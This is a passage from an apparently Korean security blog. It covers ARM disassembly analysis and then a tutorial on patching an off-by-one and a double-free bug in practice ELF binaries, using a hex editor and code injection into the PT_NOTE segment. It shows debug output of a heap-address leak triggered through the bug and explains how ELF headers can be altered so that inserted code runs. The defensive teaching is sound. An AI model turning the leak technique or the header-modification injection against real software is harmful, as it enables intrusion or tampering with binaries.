대입합니다.\n\nstruct2 의 오프셋 0xc 에 위치한 필드는 다른 구조체로의 포인터임을 추측할 수 있습니다.\n\n\n22행은 R3 + R2 * 8 을 R3 에 대입합니다.\n23행은 [R3, #0x16] 의 바이트 값을 LDRSB 인스트럭션을 사용해 R4 에 대입합니다.\n\nstruct struct1 &#123;    int unk0;       // +0x0    unk8;           // +0x8 ; struct2.unk18과 같은 타입    int unkc;       // +0xc    short unk10;    // +0x10    int unk18;      // +0x18    int unk1c;      // +0x1c&#125;;struct struct2 &#123;    struct3 *unkc;  // +0xc    unk18;          // +0x18 ; struct1.unk8과 같은 타입&#125;struct struct3 &#123;    struct4 *unkc;  // +0xc;&#125;struct struct4 &#123;    // 크기 24바이트    char unk16;     // +0x16&#125;\n\n22행, 23행에서 레지스터 값의 정수배를 오프셋으로 사용하고 있어, 배열에 접근하고 있음을 추측할 수 있습니다.\n배열의 베이스 주소는 20행의 [R1, #0xc] 이고, 오프셋으로 R3 * 3 * 8 을 연산함에서 크기가 24바이트인 struct4 구조체들의 배열임을 알 수 있습니다.\n\n오프셋 계산에 사용된 R3 은 인덱스로, 17행에서 [R0, #0xc] 를 대입한 값입니다.\n\n\n18행, 24행에서 [R0] 을 인자로 foo 함수를 호출합니다. (foo 의 인자는 1개라고 가정합니다)\n\n나머지 코드는 foo 의 리턴값과 23행에서 대입한 R4 에 대한 단순 분기문들로, 분석한 내용을 C 코드에 추가하면 대강의 로직과 구조체 사이의 참조 관계를 파악할 수 있습니다.\nBOOL unk_function(struct1 *a1, struct2 *a2, int a3, int a4) &#123;    char v5;    int v6;    if (a1.unk8 != s2.unk18        || a1.unk10 != 2        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != 0) &#123;        return 0;    &#125;        v5 = a2-&gt;unkc-&gt;unkc[a1-&gt;unkc].unk16;    v6 = foo(a1-&gt;unk0);    if (v6 == 0x61) &#123;        if (v5 != 0x61) &#123;            return 0;        &#125;    &#125; else if (v6 != 0x62 &amp;&amp; v5 &lt; 0x63) &#123;        return 0;    &#125;    return 1;&#125;\n결론\nARM 아키텍처는 RISC 아키텍처로 인스트럭션의 길이가 고정되어 있고, 메모리 접근에 load-store 모델을 사용합니다. 특히 조건부 실행이나 배럴 시프터와 같은 독특한 기능은 적은 개수의 인스트럭션으로도 다양한 코드를 표현할 수 있다는 장점이 있습니다. 범용 레지스터나 인스트럭션의 종류 등은 x86/x64 아키텍처와 차이를 보이나, 함수 호출과 분기의 원리, 구조체의 표현 등 근본적인 부분에서는 공통점을 찾을 수 있었습니다.\n참고자료\n[1] B. Dang, A. Gazet and E. Bachaalany, “ARM,” in Practical Reverse Engineering. Indianapolis, IN: Wiley, 2014, pp. 39-77.\n\n\n","categories":["Security","Reverse Engineering"]},{"title":"바이너리 패치","url":"/2022/11/27/binary-patching/","content":"개요\n바이너리 패치의 의미와 방법을 살펴보고, 코드 수정과 삽입을 통해 취약점을 패치해 보겠습니다.\n바이너리 패치\n바이너리 패치(binary patching)란 바이너리의 내용을 수정하여 다르게 동작하도록 하는 과정을 의미합니다. 바이너리 패치는 소스 코드의 확보가 제한되는 바이너리를 대상으로 분석이나 연구, 또는 취약점을 보완할 필요가 있는 상황에서 유용합니다. 예를 들어 사물인터넷(IoT) 장치의 펌웨어에서 제조사가 패치하지 못한 취약점을 자체적으로 보완하여 사용하거나, 디버거를 탐지하면 종료하는 등 분석을 방해하는 악성 코드의 기능을 무력화하기 위해 바이너리 패치 기술을 사용할 수 있습니다.\n방법론\n바이너리 패치는 바이너리의 동작을 얼마나 변형할 것인지에 따라 다양한 방법을 사용할 수 있습니다. 아주 사소한 버그를 수정하거나, 일부 코드를 무력화하는 등 기존의 동작을 조금 변형하는 정도라면 헥스 에디터를 이용하여 해당하는 인스트럭션을 수정하는 것으로도 충분합니다. 그러나 특정 함수의 동작 자체를 수정하거나, 원하는 코드를 추가적으로 실행하는 등 변형의 정도가 큰 경우에는 코드를 삽입하기 위한 다양한 방법을 사용해야 합니다.\n이 글에서는 예제 바이너리에 존재하는 두 가지 취약점을 패치하는 상황을 가정하고, 헥스 에디터를 이용한 간단한 수정과 코드를 삽입하여 패치하는 방법을 모두 연습해 보겠습니다. 실습에 사용할 바이너리는 다음 링크에서 내려받을 수 있습니다.\nexample.zip\n간단한 수정의 경우\n바이너리의 동작을 조금만 변형하는 간단한 수정의 경우, 헥스 에디터를 사용하는 방법이 직관적이고 간편합니다. 헥스 에디터를 사용하는 방법은 기초적인 도구만으로도 간편하게 패치를 할 수 있다는 장점이 있습니다. 패치의 과정은 먼저 디스어셈블러를 이용해 패치할 코드와 위치를 확인한 후, 헥스 에디터로 바이너리를 열고 해당 위치의 인스트럭션을 원하는 인스트럭션으로 덮어씁니다. 아래 그림은 헥스 에디터를 사용하여 특정 함수의 호출을 무력화하는 간단한 수정의 예시를 나타내고 있습니다.\n\n다만 이 방법은 패치할 부분을 제외한 나머지 바이트들이 제자리에 위치한 상태에서만 수정이 가능하다는 분명한 한계가 있습니다. 예를 들어 원래의 인스트럭션보다 수정할 인스트럭션의 길이가 길다면, 인스트럭션을 덮어쓸 때 이후의 인스트럭션 내용까지 덮어쓰게 되어 바이너리가 정상 동작하지 않을 수 있습니다. 코드 섹션의 사용하지 않는 여유 공간에 새로운 코드를 추가할 수도 있겠지만, 대부분의 바이너리는 코드를 추가할 만큼 충분한 여유 공간을 가지고 있지 않습니다.\noff-by-one 버그 패치하기\n바이너리에 존재하는 off-by-one 버그를 헥스 에디터를 사용한 방법으로 패치해 보겠습니다. 압축 파일에서 example1/main 파일이 패치할 바이너리입니다. 바이너리를 실행하면 add, delete, show 등의 메뉴를 확인할 수 있고, 각각의 메뉴를 선택해 보면 사용자로부터 문자열을 입력받아 관리하고 보여주는 프로그램임을 짐작할 수 있습니다.\n$ ./main1. add data2. delete data3. show data4. exit&gt;\nadd 메뉴에 해당하는 add_data 함수를 디컴파일하면 다음과 같습니다. 11행에서 길이를 입력받고, 16보다 작거나 같으면 14행에서 20바이트 크기의 구조체를 할당한 후 오프셋 16에 길이를 저장합니다. 17행의 반복문에서는 입력받은 길이만큼 1바이트씩 문자를 입력받아 구조체의 오프셋 0에서부터 저장하는 것처럼 보입니다. 20행의 조건문은 입력받은 문자가 개행 문자면 널(null) 문자로 바꾼 후 반복문을 탈출하도록 합니다.\n_DWORD *add_data()&#123;  char buf; // [rsp+7h] [rbp-19h] BYREF  unsigned int v2; // [rsp+8h] [rbp-18h] BYREF  unsigned int i; // [rsp+Ch] [rbp-14h]  _DWORD *v4; // [rsp+10h] [rbp-10h]  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  printf(&quot;length: &quot;);  __isoc99_scanf(&quot;%u&quot;, &amp;v2);  if ( v2 &lt;= 0x10 )  &#123;    v4 = malloc(0x14uLL);    v4[4] = v2;    printf(&quot;contents: &quot;);    for ( i = 0; i &lt;= v2; ++i )    &#123;      read(0, &amp;buf, 1uLL);      if ( buf == &#x27;\\n&#x27; )      &#123;        *((_BYTE *)v4 + (int)i) = &#x27;\\0&#x27;;        return v4;      &#125;      *((_BYTE *)v4 + (int)i) = buf;    &#125;    return v4;  &#125;  else  &#123;    puts(&quot;sorry, not enough space&quot;);    return 0LL;  &#125;&#125;\n그런데 반복문의 탈출 조건을 잘 보면 i &lt; v2 가 아닌 i &lt;= v2 로, 길이만큼 입력받도록 한 개발자의 의도와는 달리 실제로는 한 바이트를 더 입력할 수 있습니다. 만약 허용되는 최대 길이인 16을 입력한 후 17바이트를 입력한다면, 마지막 바이트는 구조체의 오프셋 16에 저장되면서 해당 위치에 있는 길이 값을 아래 그림과 같이 덮어쓸 것입니다.\n\nshow 메뉴에 해당하는 show_data 함수를 보면 오프셋 16의 5행에서 반복문의 탈출 조건에 사용되고 있습니다. 반복문은 구조체의 내용을 1바이트씩 출력하므로, 길이 값이 모두 몇 바이트를 출력할지 결정하고 있는 것입니다. 위의 그림과 같이 길이 값이 16보다 큰 값으로 오염된 상태라면, 힙 메모리에 대한 out-of-bounds 읽기가 발생하여 메모리 주소가 노출되는 취약점으로까지 연계될 수 있습니다.\nint __fastcall show_data(__int64 a1)&#123;  unsigned int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; *(_DWORD *)(a1 + 16) &gt; i; ++i )    write(1, (const void *)((int)i + a1), 1uLL);  return putchar(10);&#125;\n실제로 길이 값이 오염된 구조체 이후에 해제된 힙 메모리가 위치하도록 한 후, show 메뉴를 이용해 출력해보면 힙 영역의 메모리 주소가 노출되는 것을 확인할 수 있습니다.\n1. add data2. delete data3. show data4. exit[DEBUG] Received 0x2 bytes:    b&#x27;&gt; &#x27;&gt; 3...aaaaaaaaaaaa[DEBUG] Received 0x42 bytes:    00000000  61 61 61 61  61 00 00 00  00 00 00 00  21 00 00 00  │aaaa│a···│····│!···│    00000010  00 00 00 00  42 5a 7d 5d  05 00 00 00  b7 84 16 a4  │····│BZ&#125;]│····│····│    00000020  7d 43 8d e4  04 00 00 00  00 00 00 00  21 00 00 00  │&#125;C··│····│····│!···│    00000030  00 00 00 00  63 63 63 00  00 00 00 00  00 00 00 00  │····│ccc·│····│····│    00000040  00 00                                               │··│    00000042aaaaa!BZ&#125;]\u0005��\u0016�&#125;C��\u0004!ccc[DEBUG] Received 0x46 bytes:\n이와 같이 add_data 함수에 존재하는 off-by-one 버그를 헥스 에디터를 사용해 패치하여 취약점을 보완해 보겠습니다. 우선 디스어셈블러를 이용해 버그의 원인이 된 반복문 탈출 조건이 add_data 함수에서 어떤 인스트럭션에 해당하는지 조사해야 합니다. 다음은 GDB로 add_data 함수를 디스어셈블한 결과의 일부입니다. 반복문의 카운터 역할을 하는 [rbp-0x14] 에 1을 더하고 지역 변수 [rbp-0x18] 과 비교하는 부분에서 탈출 조건에 해당하는 코드임을 알 수 있습니다.\npwndbg&gt; disass add_dataDump of assembler code for function add_data:...   0x0000000000001428 &lt;+221&gt;:   add    DWORD PTR [rbp-0x14],0x1   0x000000000000142c &lt;+225&gt;:   mov    edx,DWORD PTR [rbp-0x14]   0x000000000000142f &lt;+228&gt;:   mov    eax,DWORD PTR [rbp-0x18]   0x0000000000001432 &lt;+231&gt;:   cmp    edx,eax   0x0000000000001434 &lt;+233&gt;:   jbe    0x13eb &lt;add_data+160&gt;   0x0000000000001436 &lt;+235&gt;:   mov    rax,QWORD PTR [rbp-0x10]\n여기서 정확히 off-by-one 버그의 정확한 원인이 되는 인스트럭션은 main+233 의 jbe 인스트럭션입니다. jbe 인스트럭션은 &quot;jump if below or equal&quot;을 의미하는 조건부 점프 인스트럭션으로, 버그를 패치하기 위해서는 &quot;jump below&quot;에 해당하는 jb 인스트럭션으로 바꿔야 합니다.\n그런데 GDB의 내장 디스어셈블러가 편의상 jbe 0x13eb 와 같이 출력하는 것과 달리, 조건부 점프 인스트럭션은 실제로는 점프할 주소까지의 상대적인 오프셋을 인자로 인코딩합니다. 따라서 먼저 바꿔야 하는 인스트럭션의 정확한 opcode를 확인한 후, 인자를 정확하게 표현하는 디스어셈블러로 인스트럭션의 원래 형태를 파악하는 것이 좋습니다. GDB를 사용하여 확인한 jbe 인스트럭션의 opcode는 \\x76\\xb5 입니다.\npwndbg&gt; x/2bx 0x14340x1434 &lt;add_data+233&gt;:  0x76    0xb5\n인스트럭션의 디스어셈블과 어셈블에는 shell-storm.org에서 운영하는 웹페이지를 사용하는 방법이 가장 간단합니다. 아래와 같이 웹페이지 하단에서 opcode를 입력하고 x86 (64)를 선택한 다음 Disassemble 버튼을 클릭하면, 인스트럭션의 원래 형태는 jbe 0xffffffffffffffb7 임을 파악할 수 있습니다.\n\n다음으로 웹페이지 상단에서 jb 0xffffffffffffffb7 를 입력한 후 동일하게 Assemble 버튼을 클릭하면, 새로 바꿀 opcode \\x72\\xb5 를 얻을 수 있습니다.\n\n이제 헥스 에디터를 이용하여 바이너리를 수정할 차례입니다. 헥스 에디터는 무료 소프트웨어인 HxD, 상용 소프트웨어인 010 Editor 등 잘 알려진 소프트웨어가 많으므로 자신이 사용하기 편한 것을 사용하면 됩니다. 이 글에서는 편의상 커맨드라인에서 편집이 가능한 hexedit을 사용하겠습니다. hexedit은 APT를 이용하여 설치할 수 있습니다.\nsudo apt update &amp;&amp; sudo apt install hexedit -y\nhexedit은 인자로 바이너리의 경로를 전달하여 실행합니다. 주요 단축키는 다음과 같습니다.\n\n\n\n단축키\n기능\n\n\n\n\nCtrl+G\n지정한 파일 오프셋으로 이동\n\n\nF2\n저장\n\n\nCtrl+X\n저장하고 종료\n\n\nCtrl+C\n저장하지 않고 종료\n\n\n\nmain 바이너리의 복사본 main.patched 를 만들고 hexedit으로 열어 오프셋 0x1434 로 이동하면 아래와 같이 원래의 인스트럭션에 해당하는 76 b5 가 있습니다.\n\n새로 바꿀 opcode인 72 b5 를 입력하고, 저장한 후 종료합니다. 패치된 바이너리의 add_data 함수를 GDB로 디스어셈블해보면 jbe 인스트럭션이 jb 로 바뀐 것을 확인할 수 있습니다.\npwndbg&gt; disass add_dataDump of assembler code for function add_data:...   0x0000000000001428 &lt;+221&gt;:   add    DWORD PTR [rbp-0x14],0x1   0x000000000000142c &lt;+225&gt;:   mov    edx,DWORD PTR [rbp-0x14]   0x000000000000142f &lt;+228&gt;:   mov    eax,DWORD PTR [rbp-0x18]   0x0000000000001432 &lt;+231&gt;:   cmp    edx,eax   0x0000000000001434 &lt;+233&gt;:   jb     0x13eb &lt;add_data+160&gt;   0x0000000000001436 &lt;+235&gt;:   mov    rax,QWORD PTR [rbp-0x10]\n패치된 바이너리는 앞서 힙 메모리가 노출되도록 하였던 입력을 전달하여도 더 이상 구조체의 길이 필드가 오염되지 않아 트리거에 실패합니다. 따라서 off-by-one 버그로 인해 발생하였던 취약점이 잘 보완되었음을 알 수 있습니다.\n$ ./main.patched...1. add data2. delete data3. show data4. exit&gt; 3index: 0aaaaaaaaaaaaaaaa\n코드를 삽입해야 하는 경우\n이전 문단에서는 간단한 수정이 필요한 경우 헥스 에디터를 사용하여 바이너리를 패치하는 방법을 살펴보았습니다. 그러나 이 방법은 앞서 언급하였던 대로 수정해야 할 내용이 조금만 늘어나도 바꿀 코드를 위치시킬 공간이 부족하여 적용하기 어렵습니다. 예를 들어 패치할 함수가 입력값에 대한 검증을 충분히 하고 있지 않아 검증하는 코드를 직접 추가해야 하는 경우에는 직접 바이너리에 새로운 코드를 삽입하여 메모리에 로드한 후 분기나 호출 부분을 수정하여 실행 흐름을 옮겨야 합니다.\n코드를 삽입해야 하는 경우는 새로운 코드를 메모리상에서 로드할 위치와, 기존의 실행 흐름을 돌려 새로운 코드를 실행할 방법을 모두 고려하여야 합니다. 이 글에서는 바이너리에서 실제 동작과 무관한 부분에 코드를 삽입하고, 실행 가능한 영역으로 변경하여 로드하는 방법을 소개합니다. 이 방법의 이해를 위해서는 바이너리의 섹션과 세그먼트 개념에 대한 기초적인 숙지가 필요합니다.\n섹션과 세그먼트\n바이너리의 코드와 데이터들은 논리적으로 섹션(sections)이라는 부분들로 구분되어 있습니다. 모든 섹션에 대해 섹션의 성질이나 섹션에 해당하는 바이트들의 위치를 나타내는 섹션 헤더(section headers)가 존재하며, 모든 섹션 헤더는 섹션 헤더 테이블에 위치하고 있습니다. 유의해야 할 내용은 섹션의 구분은 링커(linker)의 편의를 위한 것으로, 프로세스를 실행하기 위해 모든 섹션이 필요한 것은 아니라는 점입니다.\n다음은 /usr/include/elf.h 파일에 정의된 섹션 헤더의 구조입니다.\ntypedef struct&#123;  Elf64_Word    sh_name;        /* Section name (string tbl index) */  Elf64_Word    sh_type;        /* Section type */  Elf64_Xword   sh_flags;       /* Section flags */  Elf64_Addr    sh_addr;        /* Section virtual addr at execution */  Elf64_Off sh_offset;      /* Section file offset */  Elf64_Xword   sh_size;        /* Section size in bytes */  Elf64_Word    sh_link;        /* Link to another section */  Elf64_Word    sh_info;        /* Additional section information */  Elf64_Xword   sh_addralign;       /* Section alignment */  Elf64_Xword   sh_entsize;     /* Entry size if section holds table */&#125; Elf64_Shdr;\n섹션 헤더에서 눈여겨볼 필드들은 다음과 같습니다.\n\nsh_type 필드는 섹션의 타입을 나타내며, 타입은 섹션의 내용 및 구조에 대한 정보를 알려줍니다.\n\nSHT_PROGBITS 타입은 섹션이 인스트럭션이나 상수와 같은 프로그램 데이터로 이루어져 있음을 나타냅니다.\n\n\nsh_flags 필드는 섹션 플래그들이며, 섹션에 대한 추가적인 정보를 나타냅니다.\n\nSHF_WRITE 플래그는 섹션이 런타임에 쓰기 가능함을 나타냅니다.\nSHF_ALLOC 플래그는 섹션의 내용물이 바이너리를 실행할 때 가상 메모리로 로드됨을 나타냅니다.\nSHF_EXECINSTR 플래그는 섹션이 실행 가능한 인스트럭션들을 포함하고 있음을 나타냅니다.\n\n\nsh_addr , sh_offset , sh_size 는 각각 섹션의 가상 주소, 파일 오프셋과 크기를 나타냅니다.\n\n#define SHT_PROGBITS      1             /* Program data */#define SHF_WRITE            (1 &lt;&lt; 0)   /* Writable */#define SHF_ALLOC            (1 &lt;&lt; 1)   /* Occupies memory during execution */#define SHF_EXECINSTR        (1 &lt;&lt; 2)   /* Executable */\nreadelf 도구를 이용하여 ELF 바이너리의 섹션에 대한 정보를 확인할 수 있습니다. 다음은 아래의 실습 문단에서 사용할 example2/main 바이너리의 섹션 정보를 확인한 예시입니다.\n$ readelf --sections --wide mainThere are 31 section headers, starting at offset 0x3978:Section Headers:  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0  [ 1] .interp           PROGBITS        0000000000000318 000318 00001c 00   A  0   0  1  [ 2] .note.gnu.property NOTE            0000000000000338 000338 000030 00   A  0   0  8  [ 3] .note.gnu.build-id NOTE            0000000000000368 000368 000024 00   A  0   0  4  [ 4] .note.ABI-tag     NOTE            000000000000038c 00038c 000020 00   A  0   0  4  [ 5] .gnu.hash         GNU_HASH        00000000000003b0 0003b0 000030 00   A  6   0  8  [ 6] .dynsym           DYNSYM          00000000000003e0 0003e0 0001e0 18   A  7   1  8  [ 7] .dynstr           STRTAB          00000000000005c0 0005c0 000108 00   A  0   0  1  [ 8] .gnu.version      VERSYM          00000000000006c8 0006c8 000028 02   A  6   0  2  [ 9] .gnu.version_r    VERNEED         00000000000006f0 0006f0 000050 00   A  7   1  8  [10] .rela.dyn         RELA            0000000000000740 000740 0000f0 18   A  6   0  8  [11] .rela.plt         RELA            0000000000000830 000830 000120 18  AI  6  24  8  [12] .init             PROGBITS        0000000000001000 001000 00001b 00  AX  0   0  4  [13] .plt              PROGBITS        0000000000001020 001020 0000d0 10  AX  0   0 16  [14] .plt.got          PROGBITS        00000000000010f0 0010f0 000010 10  AX  0   0 16  [15] .plt.sec          PROGBITS        0000000000001100 001100 0000c0 10  AX  0   0 16  [16] .text             PROGBITS        00000000000011c0 0011c0 000539 00  AX  0   0 16  [17] .fini             PROGBITS        00000000000016fc 0016fc 00000d 00  AX  0   0  4  [18] .rodata           PROGBITS        0000000000002000 002000 00008e 00   A  0   0  4  [19] .eh_frame_hdr     PROGBITS        0000000000002090 002090 00005c 00   A  0   0  4  [20] .eh_frame         PROGBITS        00000000000020f0 0020f0 000148 00   A  0   0  8  [21] .init_array       INIT_ARRAY      0000000000003d60 002d60 000008 08  WA  0   0  8  [22] .fini_array       FINI_ARRAY      0000000000003d68 002d68 000008 08  WA  0   0  8  [23] .dynamic          DYNAMIC         0000000000003d70 002d70 0001f0 10  WA  7   0  8  [24] .got              PROGBITS        0000000000003f60 002f60 0000a0 08  WA  0   0  8  [25] .data             PROGBITS        0000000000004000 003000 000010 00  WA  0   0  8  [26] .bss              NOBITS          0000000000004010 003010 000020 00  WA  0   0 16  [27] .comment          PROGBITS        0000000000000000 003010 00002b 01  MS  0   0  1  [28] .symtab           SYMTAB          0000000000000000 003040 000510 18     29  18  8  [29] .strtab           STRTAB          0000000000000000 003550 000309 00      0   0  1  [30] .shstrtab         STRTAB          0000000000000000 003859 00011a 00      0   0  1Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),  L (link order), O (extra OS processing required), G (group), T (TLS),  C (compressed), x (unknown), o (OS specific), E (exclude),  D (mbind), l (large), p (processor specific)\n섹션의 구분은 링커의 편의를 위한 것입니다. 반면 바이너리를 로드할 때 관련있는 코드나 데이터를 함께 취급하거나, 특정 영역의 데이터를 로드할지 여부를 결정하기 위해서 바이너리를 세그먼트(segments) 관점으로도 구분합니다. 세그먼트는 단순히 여러 섹션을 하나로 합쳐 놓은 것입니다. 섹션과 마찬가지로, 모든 세그먼트에 대해 세그먼트의 정보를 나타내는 프로그램 헤더(program headers)가 존재합니다. 모든 프로그램 헤더는 바이너리에서 프로그램 헤더 테이블에 위치하고 있습니다.\n다음은 /usr/include/elf.h 파일에 정의된 프로그램 헤더의 구조입니다.\ntypedef struct&#123;  Elf64_Word    p_type;         /* Segment type */  Elf64_Word    p_flags;        /* Segment flags */  Elf64_Off p_offset;       /* Segment file offset */  Elf64_Addr    p_vaddr;        /* Segment virtual address */  Elf64_Addr    p_paddr;        /* Segment physical address */  Elf64_Xword   p_filesz;       /* Segment size in file */  Elf64_Xword   p_memsz;        /* Segment size in memory */  Elf64_Xword   p_align;        /* Segment alignment */&#125; Elf64_Phdr;\n프로그램 헤더에서 눈여겨볼 필드들은 다음과 같습니다.\n\np_type 필드는 세그먼트의 타입을 나타냅니다.\n\nPT_LOAD 타입은 프로세스를 실행할 때 메모리에 로드되는 세그먼트를 나타냅니다.\n\n\np_flags 필드는 세그먼트 플래그로, 세그먼트에 대한 런타임에서의 권한을 나타냅니다.\n\nPF_X , PF_W , PF_R 플래그는 각각 런타임에서 실행 가능, 쓰기 가능, 읽기 가능함을 나타냅니다.\n\n\np_offset , p_vaddr , p_filesz 필드는 각각 세그먼트의 파일 오프셋, 가상 주소와 크기를 나타냅니다.\n\n#define PT_LOAD         1               /* Loadable program segment */#define PF_X            (1 &lt;&lt; 0)        /* Segment is executable */#define PF_W            (1 &lt;&lt; 1)        /* Segment is writable */#define PF_R            (1 &lt;&lt; 2)        /* Segment is readable */\n세그먼트에 대한 정보도 readelf를 사용하여 확인할 수 있습니다. 특히 어떤 섹션들이 어떤 세그먼트에 속하는지 대응 관계를 보면, 세그먼트는 단지 여러 섹션이 합쳐진 것임을 분명히 알 수 있습니다.\n$ readelf --segments --wide mainElf file type is DYN (Position-Independent Executable file)Entry point 0x11c0There are 13 program headers, starting at offset 64Program Headers:  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align  PHDR           0x000040 0x0000000000000040 0x0000000000000040 0x0002d8 0x0002d8 R   0x8  INTERP         0x000318 0x0000000000000318 0x0000000000000318 0x00001c 0x00001c R   0x1      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]  LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x000950 0x000950 R   0x1000  LOAD           0x001000 0x0000000000001000 0x0000000000001000 0x000709 0x000709 R E 0x1000  LOAD           0x002000 0x0000000000002000 0x0000000000002000 0x000238 0x000238 R   0x1000  LOAD           0x002d60 0x0000000000003d60 0x0000000000003d60 0x0002b0 0x0002d0 RW  0x1000  DYNAMIC        0x002d70 0x0000000000003d70 0x0000000000003d70 0x0001f0 0x0001f0 RW  0x8  NOTE           0x000338 0x0000000000000338 0x0000000000000338 0x000030 0x000030 R   0x8  NOTE           0x000368 0x0000000000000368 0x0000000000000368 0x000044 0x000044 R   0x4  GNU_PROPERTY   0x000338 0x0000000000000338 0x0000000000000338 0x000030 0x000030 R   0x8  GNU_EH_FRAME   0x002090 0x0000000000002090 0x0000000000002090 0x00005c 0x00005c R   0x4  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10  GNU_RELRO      0x002d60 0x0000000000003d60 0x0000000000003d60 0x0002a0 0x0002a0 R   0x1 Section to Segment mapping:  Segment Sections...   00   01     .interp   02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt   03     .init .plt .plt.got .plt.sec .text .fini   04     .rodata .eh_frame_hdr .eh_frame   05     .init_array .fini_array .dynamic .got .data .bss   06     .dynamic   07     .note.gnu.property   08     .note.gnu.build-id .note.ABI-tag   09     .note.gnu.property   10     .eh_frame_hdr   11   12     .init_array .fini_array .dynamic .got\nPT_NOTE 세그먼트를 이용한 코드 삽입\n바이너리를 실행하기 위해 모든 섹션이 필요한 것은 아닙니다. 다시 말해 바이너리에서 실행에 필요한 코드나 데이터와는 무관한 공간들이 존재한다는 것입니다. 만약 이 공간에 추가할 코드를 삽입하고, 섹션 헤더와 프로그램 헤더를 변경하여 메모리에 로드해야 하는 코드인 것처럼 꾸미면 우리는 삽입한 코드를 바이너리의 일부였던 것처럼 실행할 수 있습니다.\n바이너리의 PT_NOTE 세그먼트와, 이 세그먼트를 구성하는 .note.* 섹션들은 특히 코드를 삽입하기 좋은 공간입니다. 원래 .note.* 섹션들은 아래 file 커맨드의 실행 결과에서 “BuildID[sha1]~” 부분과 같이 바이너리의 빌드 id나 제조사와 같은 추가적인 정보를 담기 위해 존재하는 공간입니다. 내용이 없어지거나 변형되어도 실행에 전혀 문제가 되지 않으며, 애초에 프로세스의 실행 도중에는 참조조차 되지 않는 데이터들입니다.\n$ file mainmain: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fb87af9c421d9b446165d9c00800df1664135edc, for GNU/Linux 3.2.0, not stripped\n앞서 readelf로 세그먼트를 확인한 예시를 보면 오프셋 0x368 에 존재하는 PT_NOTE 타입의 8번 세그먼트는 .note.gnu.build-id , .note.ABI-tag 의 두 개 섹션으로 이루어져 있고, 68바이트의 공간을 차지하는 읽기 전용 세그먼트입니다. 바이너리의 특정 함수에 인자를 검증하는 로직을 추가해야 한다고 가정해 보겠습니다. 추가할 코드를 해당 세그먼트에 삽입하고 기존 코드를 패치해 분기하도록 한 후, 아래와 같이 섹션 헤더와 프로그램 헤더를 변경하면 실행 흐름을 옮길 수 있습니다.\n\n이 방법을 조금 응용하면 코드의 크기가 68바이트보다 크다고 하여도 새로운 섹션 자체를 추가하여 삽입할 수 있습니다. 코드를 바이너리의 끝부분 이후에 삽입하여 새로운 공간을 만든 후, 섹션 헤더와 프로그램 헤더를 변경하여 새로운 공간의 오프셋을 가리키도록 하면 됩니다. 다만 이 경우에는 가상 주소와 오프셋 필드뿐만 아니라 크기 필드까지 새로운 공간의 크기에 해당하는 값으로 변경해야 합니다. 또한 바이너리의 크기나 섹션의 위치 등을 변경할 수 없다는 제약이 있다면 적용할 수 없습니다.\ndouble free 버그 패치하기\n이번에는 바이너리에 존재하는 double free 버그를 코드를 삽입하는 방법으로 패치해 보겠습니다. example2/main 파일이 패치할 바이너리이며, 핵심적인 로직은 이전의 example1/main 바이너리와 거의 차이가 없습니다.\nmain 함수를 보면 add 메뉴의 경우 22행에서 add_data 함수가 반환한 구조체 포인터를 s[i] 에 저장합니다. s 는 스택에 존재하는 배열이며, i 는 16행의 반복문에서 s[i] 가 NULL 인 인덱스를 자동으로 선택합니다. delete 메뉴에 해당하는 33행은 인덱스 i 를 입력받고, 16보다 작다면 s[i] 가 가리키는 구조체를 해제하기 위해 delete_data 함수를 호출합니다.\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  unsigned int v3; // [rsp+0h] [rbp-A0h] BYREF  unsigned int i; // [rsp+4h] [rbp-9Ch] BYREF  __int64 v5; // [rsp+8h] [rbp-98h]  __int64 s[18]; // [rsp+10h] [rbp-90h] BYREF  s[17] = __readfsqword(0x28u);  setup(argc, argv, envp);  memset(s, 0, 0x80uLL);  while ( 1 )  &#123;  // ...      if ( v3 == 1 )      &#123;        for ( i = 0; i &lt;= 0xF &amp;&amp; s[i]; ++i )          ;        if ( i &lt;= 0xF )        &#123;          v5 = add_data();          if ( v5 )            s[i] = v5;        &#125;  // ...      else      &#123;        if ( v3 != 2 )        &#123;LABEL_22:          puts(&quot;byebye!&quot;);          exit(0);        &#125;        printf(&quot;index: &quot;);        __isoc99_scanf(&quot;%u&quot;, &amp;i);        if ( i &gt; 0xF )LABEL_17:          puts(&quot;sorry, there is no data&quot;);        else          delete_data(s[i]);      &#125;    &#125;  &#125;&#125;\n그런데 delete_data 함수는 단순히 free 함수를 호출하는 것 이외에 별다른 기능을 하지 않습니다. 또한 main 함수에서 s[i] 를 NULL 로 초기화하는 등의 조치를 하지 않고 있어, 해제한 힙 메모리를 다시 해제할 수 있는 double free 버그가 발생합니다. double free 버그를 악용하면 동적 메모리 할당자가 할당 시 임의 주소를 반환하도록 하는 프리미티브를 구성할 수 있습니다. 또한 경우에 따라 임의 읽기 및 쓰기나 코드 실행 취약점으로 연계할 수 있습니다.\n다음은 바이너리에서 delete 메뉴를 두 번 선택하고 동일한 인덱스를 입력한 결과입니다. 동적 메모리 할당자 내부에서 double free 버그의 발생을 탐지하여 실행이 강제로 종료되었음을 확인할 수 있습니다.\n$ ./main...1. add data2. delete data3. show data4. exit&gt; 2index: 01. add data2. delete data3. show data4. exit&gt; 2index: 0free(): double free detected in tcache 2[1]    20241 IOT instruction  ./main\ndouble free 버그를 패치하기 위해서는 free 함수의 호출 이후 s[i] 가 해제된 힙 포인터를 저장하지 않도록 NULL 로 초기화하는 코드를 추가해야 합니다. 원칙적으로는 free 함수를 호출하기 이전에 s[i] 가 NULL 인지 검사하는 조건문 또한 필요하겠으나, 사실 glibc의 free 함수 구현체인 __libc_free 는 다음과 같이 인자로 주어진 포인터가 NULL 인 경우 아무 동작도 하지 